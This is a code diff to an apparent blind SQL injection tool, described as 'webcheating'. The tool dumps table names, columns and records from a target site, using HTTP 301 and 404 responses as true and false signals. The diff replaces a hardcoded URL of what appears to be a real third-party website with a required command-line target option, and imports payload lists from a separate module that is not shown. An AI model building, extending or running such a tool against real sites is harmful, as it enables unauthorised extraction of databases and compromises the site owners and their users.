@@ -4,22 +4,31 @@ import asyncio
 import string
 import sys
 import argparse
+from core.payloads import (
+    table_name_payloads,
+    column_name_payloads,
+    entity_name_payloads,
+    entity_count_payloads,
+)
 
 ############################################## TODO: add caching and sessions + logs + dumps  w__W
 
 parser = argparse.ArgumentParser(description="webcheating")
+parser.add_argument("-u", "--url", type=str, required=True, help="target URL")
 parser.add_argument("-m", "--mode", required=True, help="dump mode (table, column, entity, entity-count)")
 parser.add_argument("-o", "--offset", type=int, default=0, help="start offset (default: 0)")
 parser.add_argument("-T", "--table", required=False, help="table to enumerate")
 parser.add_argument("-C", "--column", required=False, help="column to enumerate")
 args = parser.parse_args()
 
+usr_url = args.url
 usr_mode = args.mode
 usr_offset = int(args.offset)
 usr_table = args.table
 usr_column = args.column
 ##############################################
-url = "https://www.navigator-ds.ru/articles/92" 
+
+url = usr_url
 true_code = 301
 false_code = 404  
 special_chars = "_.@-:;,/|!#$%^&*(){}[]=+~"
@@ -166,7 +175,6 @@ async def extract_table_name():
                             #column_name = ""
                             #table_name = ""
                             #break
-
             except:
                 #print("error")
                 #break
